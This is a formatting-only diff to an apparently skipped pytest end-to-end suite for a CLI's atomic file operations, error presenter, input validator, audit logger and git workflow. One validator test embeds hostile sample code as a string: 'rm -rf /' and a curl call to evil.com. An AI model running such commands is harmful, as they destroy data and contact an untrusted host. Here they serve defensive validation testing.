@@ -26,25 +26,27 @@ import pytest
 pytestmark = pytest.mark.skip(
     reason="Atomic file operations and transaction features not fully implemented"
 )
-import asyncio
-import os
-from pathlib import Path
-from unittest.mock import patch
+import asyncio  # noqa: E402
+import os  # noqa: E402
+from pathlib import Path  # noqa: E402
+from unittest.mock import patch  # noqa: E402
 
 # Import test utilities
-import sys
+import sys  # noqa: E402
+
 sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
 
-from vertice_cli.core.input_validator import InputValidator
-from vertice_cli.core.atomic_ops import AtomicFileOps
-from vertice_cli.core.error_presenter import ErrorPresenter
-from vertice_cli.core.session_manager import SessionManager
-from vertice_cli.core.audit_logger import AuditLogger, AuditEventType
+from vertice_cli.core.input_validator import InputValidator  # noqa: E402
+from vertice_cli.core.atomic_ops import AtomicFileOps  # noqa: E402
+from vertice_cli.core.error_presenter import ErrorPresenter  # noqa: E402
+from vertice_cli.core.session_manager import SessionManager  # noqa: E402
+from vertice_cli.core.audit_logger import AuditLogger, AuditEventType  # noqa: E402
 
 
 # ==============================================================================
 # FIXTURES
 # ==============================================================================
+
 
 @pytest.fixture
 def senior_workspace(tmp_path):
@@ -55,25 +57,30 @@ def senior_workspace(tmp_path):
     # Create professional project structure
     (workspace / "src").mkdir()
     (workspace / "src" / "__init__.py").write_text("")
-    (workspace / "src" / "main.py").write_text('''"""Main module."""
+    (workspace / "src" / "main.py").write_text(
+        '''"""Main module."""
 def main():
     """Entry point."""
     print("Hello, World!")
 
 if __name__ == "__main__":
     main()
-''')
-    (workspace / "src" / "utils.py").write_text('''"""Utility functions."""
+'''
+    )
+    (workspace / "src" / "utils.py").write_text(
+        '''"""Utility functions."""
 from typing import List, Dict, Any
 
 def process_data(data: List[Dict[str, Any]]) -> Dict[str, Any]:
     """Process input data."""
     return {"processed": len(data), "items": data}
-''')
+'''
+    )
 
     (workspace / "tests").mkdir()
     (workspace / "tests" / "__init__.py").write_text("")
-    (workspace / "tests" / "test_main.py").write_text('''"""Tests for main module."""
+    (workspace / "tests" / "test_main.py").write_text(
+        '''"""Tests for main module."""
 import pytest
 from src.main import main
 
@@ -81,21 +88,26 @@ def test_main():
     """Test main function."""
     # Should not raise
     main()
-''')
+'''
+    )
 
-    (workspace / "pyproject.toml").write_text('''[project]
+    (workspace / "pyproject.toml").write_text(
+        """[project]
 name = "senior-project"
 version = "1.0.0"
 requires-python = ">=3.10"
 
 [project.optional-dependencies]
 test = ["pytest>=8.0"]
-''')
+"""
+    )
 
     (workspace / "README.md").write_text("# Senior Project\n\nProfessional quality code.\n")
 
     # Initialize git
-    os.system(f"cd {workspace} && git init -q && git add . && git commit -m 'Initial commit' -q 2>/dev/null")
+    os.system(
+        f"cd {workspace} && git init -q && git add . && git commit -m 'Initial commit' -q 2>/dev/null"
+    )
 
     return workspace
 
@@ -121,15 +133,13 @@ def error_presenter():
 @pytest.fixture
 def audit_logger(tmp_path):
     """Get AuditLogger instance."""
-    return AuditLogger(
-        log_dir=str(tmp_path / "audit_logs"),
-        enable_file_logging=True
-    )
+    return AuditLogger(log_dir=str(tmp_path / "audit_logs"), enable_file_logging=True)
 
 
 # ==============================================================================
 # TEST CLASS: FILE OPERATIONS (Senior expects atomic, reliable ops)
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.senior
@@ -158,7 +168,7 @@ def new_function():
         original_content = file_path.read_text()
 
         # Simulate failure by trying to write to read-only location
-        with patch.object(atomic_ops, '_write_temp_file', side_effect=IOError("Disk full")):
+        with patch.object(atomic_ops, "_write_temp_file", side_effect=IOError("Disk full")):
             result = atomic_ops.write_atomic(str(file_path), "new content")
 
         assert not result.success, "Should fail gracefully"
@@ -180,7 +190,7 @@ def new_function():
             results = await asyncio.gather(*tasks, return_exceptions=True)
             return results
 
-        results = asyncio.run(run_concurrent())
+        asyncio.run(run_concurrent())
 
         # All writes should succeed (last one wins)
         assert file_path.exists(), "File should exist"
@@ -193,11 +203,7 @@ def new_function():
         original_content = file_path.read_text()
 
         # Enable backup mode
-        result = atomic_ops.write_atomic(
-            str(file_path),
-            "# Modified content\n",
-            create_backup=True
-        )
+        result = atomic_ops.write_atomic(str(file_path), "# Modified content\n", create_backup=True)
 
         assert result.success, "Write should succeed"
 
@@ -205,7 +211,9 @@ def new_function():
         backup_path = Path(result.backup_path) if result.backup_path else None
         if backup_path:
             assert backup_path.exists(), "Backup file should exist"
-            assert backup_path.read_text() == original_content, "Backup should have original content"
+            assert (
+                backup_path.read_text() == original_content
+            ), "Backup should have original content"
 
     def test_large_file_handling_no_truncation(self, senior_workspace, atomic_ops):
         """Senior expects large files handled without truncation."""
@@ -214,12 +222,17 @@ def new_function():
         # Create a large file (1MB of Python code)
         large_content = '''"""Large module with many functions."""
 
-''' + '\n'.join([f'''
+''' + "\n".join(
+            [
+                f'''
 def function_{i}(x: int, y: int) -> int:
     """Function {i} documentation."""
     result = x + y + {i}
     return result
-''' for i in range(5000)])
+'''
+                for i in range(5000)
+            ]
+        )
 
         result = atomic_ops.write_atomic(str(file_path), large_content)
 
@@ -231,6 +244,7 @@ def function_{i}(x: int, y: int) -> int:
 # ==============================================================================
 # TEST CLASS: ERROR HANDLING (Senior expects professional errors)
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.senior
@@ -257,16 +271,20 @@ class TestSeniorErrorHandling:
         presented = error_presenter.present(error, mode="developer")
 
         assert presented.suggestions, "Should provide suggestions"
-        assert any("pip install" in s.lower() or "install" in s.lower()
-                   for s in presented.suggestions), "Should suggest installation"
+        assert any(
+            "pip install" in s.lower() or "install" in s.lower() for s in presented.suggestions
+        ), "Should suggest installation"
 
     def test_error_preserves_full_traceback(self, error_presenter):
         """Senior expects full traceback for debugging."""
         try:
+
             def inner():
                 raise ValueError("Deep error")
+
             def outer():
                 inner()
+
             outer()
         except ValueError as e:
             presented = error_presenter.present(e, mode="developer", include_traceback=True)
@@ -287,8 +305,9 @@ class TestSeniorErrorHandling:
 
         for error, expected_category in test_cases:
             presented = error_presenter.present(error, mode="developer")
-            assert expected_category in presented.category.lower(), \
-                f"Error {type(error).__name__} should be categorized as {expected_category}"
+            assert (
+                expected_category in presented.category.lower()
+            ), f"Error {type(error).__name__} should be categorized as {expected_category}"
 
     def test_error_no_sensitive_data_leak(self, error_presenter):
         """Senior expects no sensitive data in error messages."""
@@ -304,6 +323,7 @@ class TestSeniorErrorHandling:
 # ==============================================================================
 # TEST CLASS: INPUT VALIDATION (Senior expects strict validation)
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.senior
@@ -360,16 +380,16 @@ class TestSeniorInputValidation:
 
     def test_validates_code_content(self, input_validator):
         """Senior expects code content to be validated."""
-        valid_code = '''
+        valid_code = """
 def hello():
     print("Hello, World!")
-'''
+"""
 
-        suspicious_code = '''
+        suspicious_code = """
 import os
 os.system("rm -rf /")
 __import__('subprocess').call(['curl', 'evil.com'])
-'''
+"""
 
         result_valid = input_validator.validate_code(valid_code)
         assert result_valid.is_valid, "Normal code should be valid"
@@ -391,6 +411,7 @@ __import__('subprocess').call(['curl', 'evil.com'])
 # ==============================================================================
 # TEST CLASS: TRANSACTION & ROLLBACK (Senior expects ACID properties)
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.senior
@@ -419,8 +440,7 @@ class TestSeniorTransactions:
 
         if new_files:
             # Success case: all files created
-            assert len(new_files) == len(files_to_create), \
-                "All files should be created or none"
+            assert len(new_files) == len(files_to_create), "All files should be created or none"
         else:
             # Rollback case: no files created
             assert len(new_files) == 0, "Rollback should remove all created files"
@@ -437,8 +457,7 @@ class TestSeniorTransactions:
         result = atomic_ops.undo()
 
         assert result.success, "Undo should succeed"
-        assert file_path.read_text() == original_content, \
-            "Content should be restored exactly"
+        assert file_path.read_text() == original_content, "Content should be restored exactly"
 
     def test_checkpoint_and_restore(self, senior_workspace):
         """Senior expects checkpoint/restore for complex operations."""
@@ -462,6 +481,7 @@ class TestSeniorTransactions:
 # TEST CLASS: AUDIT & TRACEABILITY (Senior expects full audit trail)
 # ==============================================================================
 
+
 @pytest.mark.e2e
 @pytest.mark.senior
 class TestSeniorAudit:
@@ -474,13 +494,11 @@ class TestSeniorAudit:
             action="write_file",
             resource=str(senior_workspace / "test.py"),
             success=True,
-            details={"size": 100}
+            details={"size": 100},
         )
 
         audit_logger.log_operation(
-            action="read_file",
-            resource=str(senior_workspace / "src/main.py"),
-            success=True
+            action="read_file", resource=str(senior_workspace / "src/main.py"), success=True
         )
 
         # Query logs
@@ -497,7 +515,7 @@ class TestSeniorAudit:
             audit_logger.log(
                 event_type=AuditEventType.OPERATION_COMPLETE,
                 action=f"operation_{i}",
-                resource=f"file_{i}.py"
+                resource=f"file_{i}.py",
             )
 
         # Verify chain integrity
@@ -509,15 +527,13 @@ class TestSeniorAudit:
         """Senior expects correlation IDs for tracing operations."""
         with audit_logger.correlation_context("task-123") as correlation_id:
             audit_logger.log(
-                event_type=AuditEventType.OPERATION_START,
-                action="complex_task",
-                resource="project"
+                event_type=AuditEventType.OPERATION_START, action="complex_task", resource="project"
             )
 
             audit_logger.log(
                 event_type=AuditEventType.OPERATION_COMPLETE,
                 action="complex_task",
-                resource="project"
+                resource="project",
             )
 
         # Query by correlation ID
@@ -533,13 +549,11 @@ class TestSeniorAudit:
         start_time = time.time()
 
         audit_logger.log(
-            event_type=AuditEventType.OPERATION_COMPLETE,
-            action="test_operation",
-            resource="test"
+            event_type=AuditEventType.OPERATION_COMPLETE, action="test_operation", resource="test"
         )
 
         time.sleep(0.1)
-        end_time = time.time()
+        time.time()
 
         # Query with time range
         logs = audit_logger.query(since=start_time)
@@ -550,6 +564,7 @@ class TestSeniorAudit:
 # ==============================================================================
 # TEST CLASS: GIT INTEGRATION (Senior expects professional git workflow)
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.senior
@@ -565,11 +580,9 @@ class TestSeniorGitIntegration:
         (senior_workspace / "new_file.py").write_text("# New\n")
 
         import subprocess
+
         result = subprocess.run(
-            ["git", "status", "--porcelain"],
-            cwd=senior_workspace,
-            capture_output=True,
-            text=True
+            ["git", "status", "--porcelain"], cwd=senior_workspace, capture_output=True, text=True
         )
 
         status = result.stdout
@@ -583,17 +596,14 @@ class TestSeniorGitIntegration:
         file_path.write_text("# Changed content\nprint('modified')\n")
 
         import subprocess
+
         result = subprocess.run(
-            ["git", "diff", "src/main.py"],
-            cwd=senior_workspace,
-            capture_output=True,
-            text=True
+            ["git", "diff", "src/main.py"], cwd=senior_workspace, capture_output=True, text=True
         )
 
         diff = result.stdout
 
-        assert "Changed content" in diff or "modified" in diff, \
-            "Diff should show new content"
+        assert "Changed content" in diff or "modified" in diff, "Diff should show new content"
 
     def test_git_commit_atomic(self, senior_workspace):
         """Senior expects git commits to be atomic."""
@@ -601,23 +611,21 @@ class TestSeniorGitIntegration:
         (senior_workspace / "src" / "main.py").write_text("# Commit test\n")
 
         import subprocess
+
         subprocess.run(["git", "add", "src/main.py"], cwd=senior_workspace)
 
         result = subprocess.run(
             ["git", "commit", "-m", "Test commit"],
             cwd=senior_workspace,
             capture_output=True,
-            text=True
+            text=True,
         )
 
         assert result.returncode == 0, f"Commit should succeed: {result.stderr}"
 
         # Verify commit
         log_result = subprocess.run(
-            ["git", "log", "--oneline", "-1"],
-            cwd=senior_workspace,
-            capture_output=True,
-            text=True
+            ["git", "log", "--oneline", "-1"], cwd=senior_workspace, capture_output=True, text=True
         )
 
         assert "Test commit" in log_result.stdout, "Commit message should be recorded"
@@ -626,6 +634,7 @@ class TestSeniorGitIntegration:
 # ==============================================================================
 # TEST CLASS: PERFORMANCE EXPECTATIONS (Senior expects fast response)
 # ==============================================================================
+
 
 @pytest.mark.e2e
 @pytest.mark.senior
@@ -639,7 +648,7 @@ class TestSeniorPerformance:
         file_path = senior_workspace / "src" / "main.py"
 
         start = time.perf_counter()
-        content = file_path.read_text()
+        file_path.read_text()
         elapsed = time.perf_counter() - start
 
         assert elapsed < 0.1, f"File read took {elapsed:.3f}s, expected < 100ms"
@@ -651,7 +660,7 @@ class TestSeniorPerformance:
         test_input = "pytest tests/ -v --cov=src"
 
         start = time.perf_counter()
-        result = input_validator.validate_command(test_input)
+        input_validator.validate_command(test_input)
         elapsed = time.perf_counter() - start
 
         assert elapsed < 0.01, f"Validation took {elapsed:.3f}s, expected < 10ms"
